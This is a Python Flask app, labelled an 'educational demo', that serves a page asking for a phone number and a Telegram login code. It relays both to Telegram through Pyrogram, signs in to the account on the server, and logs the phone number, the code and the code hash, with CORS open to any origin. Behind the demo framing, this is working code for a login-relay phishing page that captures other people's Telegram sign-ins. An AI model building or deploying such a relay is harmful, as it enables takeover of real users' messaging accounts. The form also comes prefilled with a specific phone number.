import os
import asyncio
import logging
import time
from flask import Flask, request, jsonify
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, 
    PhoneCodeInvalid, 
    PhoneNumberInvalid, 
    PhoneCodeExpired,
    FloodWait
)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Добавляем CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

def load_api_keys():
    """Загружаем API ключи с проверкой"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
        logger.info("✅ .env файл загружен")
    except ImportError:
        logger.warning("⚠️ python-dotenv не установлен")
    
    # Получаем ключи из переменных окружения
    api_id = os.getenv('TELEGRAM_API_ID')
    api_hash = os.getenv('TELEGRAM_API_HASH')
    secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
    
    return api_id, api_hash, secret_key

# Загружаем ключи при старте
API_ID, API_HASH, SECRET_KEY = load_api_keys()
app.secret_key = SECRET_KEY

# Хранилище для сессий
AUTH_SESSIONS = {}

class TelegramAuthTester:
    def __init__(self):
        self.api_id = None
        self.api_hash = None
        self.initialized = False
        self.initialize_client()
        
    def initialize_client(self):
        """Инициализируем клиент с проверкой ключей"""
        try:
            if not API_ID or not API_HASH:
                logger.error("❌ API ключи не установлены")
                self.initialized = False
                return
                
            self.api_id = int(API_ID)
            self.api_hash = API_HASH
            self.initialized = True
            logger.info(f"✅ Pyrogram тестер инициализирован с API_ID: {self.api_id}")
            
        except ValueError as e:
            logger.error(f"❌ Неверный формат API_ID: {e}")
            self.initialized = False
        except Exception as e:
            logger.error(f"❌ Ошибка инициализации: {e}")
            self.initialized = False
        
    async def request_code(self, phone_number):
        """Запрос кода аутентификации"""
        if not self.initialized:
            return {'success': False, 'error': 'Клиент не инициализирован'}
            
        client = None
        try:
            # Создаем нового клиента Pyrogram
            session_name = f"session_{int(time.time())}"
            client = Client(
                name=session_name,
                api_id=self.api_id,
                api_hash=self.api_hash,
                in_memory=True  # Не сохраняем сессию на диск
            )
            
            await client.connect()
            
            # Запрашиваем код
            logger.info(f"📱 Запрос кода для: {phone_number}")
            sent_code = await client.send_code(phone_number)
            
            # Сохраняем сессию
            session_id = f"{phone_number}_{int(time.time())}"
            AUTH_SESSIONS[session_id] = {
                'client': client,
                'phone': phone_number,
                'phone_code_hash': sent_code.phone_code_hash,
                'created_at': time.time()
            }
            
            logger.info(f"📱 Код отправлен. Session: {session_id}")
            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
            
            return {
                'success': True,
                'message': 'Код отправлен',
                'session_id': session_id,
                'is_test': True
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка запроса кода: {e}")
            if client:
                try:
                    await client.disconnect()
                except:
                    pass
            return {'success': False, 'error': f'Ошибка: {str(e)}'}
    
    async def verify_code(self, session_id, code):
        """Верификация кода"""
        if session_id not in AUTH_SESSIONS:
            return {'success': False, 'error': 'Сессия не найдена'}
            
        session_data = AUTH_SESSIONS[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        
        try:
            logger.info(f"🔐 Верификация кода {code} для {phone}")
            logger.info(f"🔐 Используем phone_code_hash: {phone_code_hash}")
            
            # Входим с кодом
            await client.sign_in(
                phone_number=phone,
                phone_code_hash=phone_code_hash,
                phone_code=code
            )
            
            logger.info("✅ Успешная аутентификация")
            
            # Очищаем сессию
            await client.disconnect()
            del AUTH_SESSIONS[session_id]
            
            return {
                'success': True,
                'message': 'Аутентификация успешна!',
                'is_test': True
            }
            
        except SessionPasswordNeeded:
            logger.info("🔒 Требуется 2FA пароль")
            return {
                'success': True,
                'message': 'Требуется пароль 2FA',
                'needs_password': True
            }
            
        except PhoneCodeInvalid as e:
            logger.warning(f"⚠️ Неверный код: {e}")
            return {'success': False, 'error': 'Неверный код подтверждения'}
            
        except PhoneCodeExpired as e:
            logger.warning(f"⏰ Код истек: {e}")
            await client.disconnect()
            del AUTH_SESSIONS[session_id]
            return {'success': False, 'error': 'Код истек. Запросите новый.'}
            
        except FloodWait as e:
            logger.warning(f"⏳ Flood wait: {e.value} секунд")
            await client.disconnect()
            del AUTH_SESSIONS[session_id]
            return {
                'success': False, 
                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
            }
            
        except Exception as e:
            logger.error(f"❌ Ошибка верификации: {e}")
            try:
                await client.disconnect()
            except:
                pass
            if session_id in AUTH_SESSIONS:
                del AUTH_SESSIONS[session_id]
            return {'success': False, 'error': f'Ошибка: {str(e)}'}

# Инициализация
auth_tester = TelegramAuthTester()

def run_async(coro):
    """Запуск асинхронных функций"""
    try:
        return asyncio.run(coro)
    except Exception as e:
        logger.error(f"❌ Ошибка в run_async: {e}")
        return {'success': False, 'error': f'Ошибка выполнения: {str(e)}'}

# 🎯 Образовательные маршруты
@app.route('/')
def educational_demo():
    status = "✅ СИСТЕМА ГОТОВА" if auth_tester.initialized else "❌ ПРОВЕРЬТЕ API КЛЮЧИ"
    status_color = "status-success" if auth_tester.initialized else "status-error"
    
    return f'''
<!DOCTYPE html>
<html>
<head>
    <title>Educational Auth Demo</title>
    <style>
        body {{ 
            font-family: Arial, sans-serif; 
            margin: 40px;
            background: #f5f5f5;
        }}
        .container {{ 
            max-width: 500px; 
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .input {{ 
            width: 100%; 
            padding: 12px; 
            margin: 8px 0; 
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }}
        .btn {{ 
            background: #007bff; 
            color: white; 
            padding: 12px 24px; 
            border: none; 
            border-radius: 5px;
            cursor: pointer; 
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }}
        .btn:hover {{ background: #0056b3; }}
        .btn:disabled {{ background: #6c757d; cursor: not-allowed; }}
        .alert {{ 
            padding: 12px; 
            margin: 15px 0; 
            border-radius: 5px;
            border: 1px solid;
        }}
        .success {{ background: #d4edda; color: #155724; border-color: #c3e6cb; }}
        .error {{ background: #f8d7da; color: #721c24; border-color: #f5c6cb; }}
        .info {{ background: #d1ecf1; color: #0c5460; border-color: #bee5eb; }}
        .warning {{ background: #fff3cd; color: #856404; border-color: #ffeaa7; }}
        .status {{ 
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            margin-bottom: 20px;
            font-weight: bold;
        }}
        .status-success {{ background: #d4edda; color: #155724; }}
        .status-error {{ background: #f8d7da; color: #721c24; }}
        .debug-info {{
            background: #e9ecef;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 12px;
            margin: 10px 0;
        }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Educational Auth Demo (Pyrogram)</h1>
        <p>Демонстрация механизмов аутентификации (ТОЛЬКО ДЛЯ ОБРАЗОВАНИЯ)</p>
        
        <div class="status {status_color}">
            {status}
        </div>
        
        <div class="alert warning">
            ⚠️ <strong>ВНИМАНИЕ:</strong> Это образовательная демонстрация. Используйте только тестовые данные!
        </div>

        <div class="debug-info">
            <strong>Отладочная информация:</strong><br>
            API_ID: {API_ID if API_ID else 'Не установлен'}<br>
            API_HASH: {'Установлен' if API_HASH else 'Не установлен'}<br>
            Активные сессии: {len(AUTH_SESSIONS)}<br>
            Библиотека: Pyrogram
        </div>
        
        <div id="step1">
            <h3>Тест аутентификации</h3>
            <input type="text" id="phone" class="input" placeholder="Введите номер телефона" value="+79220470330">
            <button class="btn" onclick="requestCode()" id="requestBtn">Получить код</button>
        </div>
        
        <div id="step2" style="display:none;">
            <h3>Введите код из Telegram</h3>
            <input type="text" id="code" class="input" placeholder="Введите 5-значный код" maxlength="5">
            <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
        </div>
        
        <div id="results"></div>
        
        <div class="alert info">
            <strong>Образовательная цель:</strong> Изучение механизмов аутентификации в мессенджерах
        </div>
    </div>

    <script>
        let currentSessionId = '';
        let currentPhone = '';

        function showAlert(message, type) {{
            const results = document.getElementById('results');
            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
        }}

        async function requestCode() {{
            const phone = document.getElementById('phone').value.trim();
            currentPhone = phone;

            if (!phone) {{
                showAlert('Введите номер телефона', 'error');
                return;
            }}

            const btn = document.getElementById('requestBtn');
            btn.disabled = true;
            btn.textContent = 'Отправка...';

            try {{
                const response = await fetch('/api/auth/request', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{phone: phone}})
                }});
                
                if (!response.ok) {{
                    const errorText = await response.text();
                    throw new Error(`HTTP error! status: ${{response.status}}, response: ${{errorText}}`);
                }}
                
                const data = await response.json();
                
                if (data.success) {{
                    currentSessionId = data.session_id;
                    document.getElementById('step2').style.display = 'block';
                    showAlert('✅ Код отправлен! Проверьте Telegram и введите код.', 'success');
                    document.getElementById('code').focus();
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Получить код';
            }}
        }}

        async function verifyCode() {{
            const code = document.getElementById('code').value.trim();

            if (!code || code.length !== 5) {{
                showAlert('Введите 5-значный код из Telegram', 'error');
                return;
            }}

            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = 'Проверка...';

            try {{
                const response = await fetch('/api/auth/verify', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        session_id: currentSessionId,
                        code: code
                    }})
                }});
                
                if (!response.ok) {{
                    const errorText = await response.text();
                    throw new Error(`HTTP error! status: ${{response.status}}, response: ${{errorText}}`);
                }}
                
                const data = await response.json();
                
                if (data.success) {{
                    showAlert('✅ ' + data.message, 'success');
                    document.getElementById('step2').style.display = 'none';
                    document.getElementById('code').value = '';
                }} else {{
                    showAlert('❌ ' + data.error, 'error');
                    document.getElementById('code').value = '';
                    document.getElementById('code').focus();
                }}
            }} catch (error) {{
                console.error('Error:', error);
                showAlert('❌ Ошибка сети: ' + error.message, 'error');
            }} finally {{
                btn.disabled = false;
                btn.textContent = 'Проверить код';
            }}
        }}

        document.getElementById('phone').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') requestCode();
        }});
        
        document.getElementById('code').addEventListener('keypress', function(e) {{
            if (e.key === 'Enter') verifyCode();
        }});

        document.getElementById('code').addEventListener('input', function(e) {{
            if (e.target.value.length === 5) {{
                verifyCode();
            }}
        }});
    </script>
</body>
</html>
'''

@app.route('/api/auth/request', methods=['POST', 'OPTIONS'])
def auth_request():
    """Запрос кода аутентификации"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
        
        result = run_async(auth_tester.request_code(phone))
        return jsonify(result)
    except Exception as e:
        logger.error(f"❌ Ошибка в auth_request: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/api/auth/verify', methods=['POST', 'OPTIONS'])
def auth_verify():
    """Верификация кода"""
    if request.method == 'OPTIONS':
        return jsonify({'status': 'ok'})
        
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
            
        session_id = data.get('session_id', '').strip()
        code = data.get('code', '').strip()
        
        if not session_id or not code:
            return jsonify({'success': False, 'error': 'Введите код'}), 400
        
        result = run_async(auth_tester.verify_code(session_id, code))
        return jsonify(result)
    except Exception as e:
        logger.error(f"❌ Ошибка в auth_verify: {e}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500

@app.route('/status')
def status():
    """Проверка статуса API"""
    return jsonify({
        'api_initialized': auth_tester.initialized,
        'active_sessions': len(AUTH_SESSIONS),
        'api_id_set': bool(API_ID),
        'api_hash_set': bool(API_HASH),
        'library': 'Pyrogram'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=False)
